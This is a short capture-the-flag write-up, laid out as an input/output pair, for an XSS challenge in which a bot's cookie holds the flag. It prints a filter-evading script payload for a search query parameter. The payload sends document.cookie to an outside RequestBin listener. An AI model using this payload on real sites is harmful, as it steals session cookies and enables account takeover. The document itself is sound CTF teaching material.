## input
xss3.ctf.tamu.edu  
The filtering is perfect this time, really! You know the drill; the client's cookie contains your flag.  

## output
As the previous challenge __Secret Cross-site Cookies__, we create a RequestBin to listen on the web and we put the XSS payload on the URL to check that the XSS is working for us:  
`xss3.ctf.tamu.edu/web/search_query.php?query=><scRiPt>document.write('<IMG SRC=\"http://requestb.in/1464vht1?cookie='%2bdocument.cookie);</sCripT>`

It's working for us so it has to work for the bot:
![URL](https://github.com/mhackgyver-squad/mhackgyver/blob/master/writeup/images/SUPER_Secret_Cross-Site_Cookies_URL_creation.png)

And effectively:
![flag](https://github.com/mhackgyver-squad/mhackgyver/blob/master/writeup/images/SUPER_Secret_Cross-Site_Cookies_URL_flag.png)
